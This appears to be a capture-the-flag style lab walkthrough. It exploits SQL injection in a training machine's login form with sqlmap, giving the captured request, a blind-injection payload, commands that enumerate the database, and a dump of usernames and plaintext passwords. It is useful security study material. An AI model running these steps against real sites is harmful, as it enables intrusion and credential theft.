first need to find a field that is vulnerable to `SQL`, this field fo this machine is found after `registering` a user `test` then logging in
![[Pasted image 20241125121927.png]]
once the field is identified, copy and paste the `post` request into a file, in this case i named it `post_request.txt`
```bash
POST /auth HTTP/1.1
Host: piano_protocol
Content-Length: 479
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://piano_protocol
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarys1scYHAtVLYV0ILq
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://piano_protocol/login
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=c78271e1937e7c135f4ab78e93185341; XSRF-TOKEN=eyJpdiI6InBDMXJVVDl0RERJY2FZUDllSENNS3c9PSIsInZhbHVlIjoiVWlnaUswY2Q4SlpUQ0RNNG9IVmo0SmVtbTN3eithL2t4Ym5rQ1FqbzdkcjNacWtETjJzcjhyYVZMeFpIWHZyd0lWaVV1SSsxRGI2MmRzd2YxQ25MTVhpWno2NHlUM3N3UHFsVnNYRHEydjFCcnk5ZytMT1hmcndRWGxreDExNnQiLCJtYWMiOiJhOTllNjIwNTIzZDgyMGJjYjg1ZGE3NDRhMmY3MDUyNzkzM2Q3NDRlYjMwMmEzOWU4Y2EyMTc1MWMwOWYxMjkxIn0%3D; laravel_session=eyJpdiI6IjRaOTdsK29yMUIwaStqMG0yRVpmNnc9PSIsInZhbHVlIjoiRitwSDZZR29JekJucU9OT1ZJMTA0dFFmSW1MV2YreSs3OE5lY21ZdnJ2eUxDcFZhRWd5NG9mcXBVVy9hb0dIWlpRVTkyaTR5NmNURWlkU2NQYUJoU3d0NkhhZ215S21OT1RnNkl5RXFrbXl6Y2hJREJEc3hvaGQwWkxLbWFsOFQiLCJtYWMiOiJhMWMyOWE5MTI1MWY1MjA5ZWM1YjAzYTI5OWJkODA5MjY0MzFiZTNkNTk5NTUyZjcyMmU2ZDhlNzdkNjE5MGZhIn0%3D
Connection: keep-aliva

------WebKitFormBoundarys1scYHAtVLYV0ILq
Content-Disposition: form-data; name="_token"


h4p41ENQBoh4WHUE3jfyyZlnvIHe6jXJQ0DGhw2S
------WebKitFormBoundarys1scYHAtVLYV0ILq
Content-Disposition: form-data; name="username"



test
------WebKitFormBoundarys1scYHAtVLYV0ILq
Content-Disposition: form-data; name="password"


test
------WebKitFormBoundarys1scYHAtVLYV0ILq
Content-Disposition: form-data; name="dType"

loginRequest

------WebKitFormBoundarys1scYHAtVLYV0ILq--
```

---------
Utilize this command to test each field - just change `username` until you find the right field
```bash
┌──(root💀gobots)-[25Nov2024 17:30:01]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]                                                  
└─# sqlmap -r post_request.txt -p username --level=3 --risk=3 --batch                                                                                                   
        ___                                                                                                                              
       __H__                                                                                                                              
 ___ ___[']_____ ___ ___  {1.8.5#stable}                                                                                                  
|_ -| . [']     | .'| . |                                                                                                                 
|___|_  ["]_|_|_|__,|  _|                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers a
ssume no liability and are not responsible for any misuse or damage caused by this program                                                                      
[*] starting @ 17:30:06 /2024-11-25/                                                                                                                            
[17:30:06] [INFO] parsing HTTP request from 'post_request.txt'                                                                                                  
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y                                                                                    
[17:30:07] [INFO] resuming back-end DBMS 'mysql'                                                                                                                
[17:30:07] [INFO] testing connection to the target URL                                                                                                          
sqlmap resumed the following injection point(s) from stored session:                                                                                            
---                                                                                                                                                                                                        
Parameter: MULTIPART username ((custom) POST)                                                                                                                                                              
    Type: boolean-based blind                                                                                                                                                                              
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause                                                                                                                    
    Payload: ------WebKitFormBoundarys1scYHAtVLYV0ILq
Content-Disposition: form-data; name="_token"

h4p41ENQBoh4WHUE3jfyyZlnvIHe6jXJQ0DGhw2S
------WebKitFormBoundarys1scYHAtVLYV0ILq
Content-Disposition: form-data; name="username"

test' RLIKE (SELECT (CASE WHEN (7730=7730) THEN 0x74657374 ELSE 0x28 END)) AND 'pcTK'='pcTK                  ################
------WebKitFormBoundarys1scYHAtVLYV0ILq
Content-Disposition: form-data; name="password"

test
------WebKitFormBoundarys1scYHAtVLYV0ILq
Content-Disposition: form-data; name="dType"

loginRequest
------WebKitFormBoundarys1scYHAtVLYV0ILq--

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)

```
once finding that the `username` field is the vulnerable field we can use this command  to get the database `schema`
```bash
──(root💀gobots)-[25Nov2024 17:13:47]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]                                             
└─# sqlmap -r post_request.txt -p username --dbs --batch              

[17:16:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 7.3.33, Apache 2.4.52
back-end DBMS: MySQL >= 5.6
[17:16:53] [INFO] fetching database names
available databases [6]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] piano_protocol
[*] sqli
[*] sys

```
looking at the `tables` in the `piano_protocol` database
```bash
┌──(root💀gobots)-[25Nov2024 17:30:07]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]                                            
└─# sqlmap -r post_request.txt -p username -D piano_protocol --tables --batch      
Database: piano_protocol
[2 tables]
+------------------+
| contact_requests |
| users            |
+------------------+

```
looking at the `columns` in the `users` database
```bash
┌──(root💀gobots)-[25Nov2024 17:34:09]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]                                            
└─# sqlmap -r post_request.txt -p username -D piano_protocol -T users --columns --batch 
[17:34:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 7.3.33, Apache 2.4.52
back-end DBMS: MySQL >= 5.6
[17:34:27] [INFO] fetching columns for table 'users' in database 'piano_protocol'
Database: piano_protocol
Table: users
[6 columns]
+-----------+---------------+
| Column    | Type          |
+-----------+---------------+
| email     | varchar(255)  |
| firstname | varchar(255)  |
| id        | int(11)       |
| lastname  | varchar(255)  |
| password  | varchar(255)  |
| username  | varchar(3000) |
+-----------+---------------+

```
looking at the `data` in the `columns` for the `users` table in the `piano_protocol` database
```bash
┌──(root💀gobots)-[25Nov2024 17:34:27]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]                                                                        
└─# sqlmap -r post_request.txt -p username -D piano_protocol -T users -C username,password --dump --batch 
[17:34:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.52, PHP 7.3.33
back-end DBMS: MySQL >= 5.6
[17:34:43] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'piano_protocol'
Database: piano_protocol
Table: users
[2 entries]
+----------+-------------------+
| username | password          |
+----------+-------------------+
| admin    | djj28hah*dhk2hd1% |
| test     | test              |

```
logged in with credentials `3af91b2360b56d5cdf0b4ece2459cc50`
![[Pasted image 20241125132214.png]]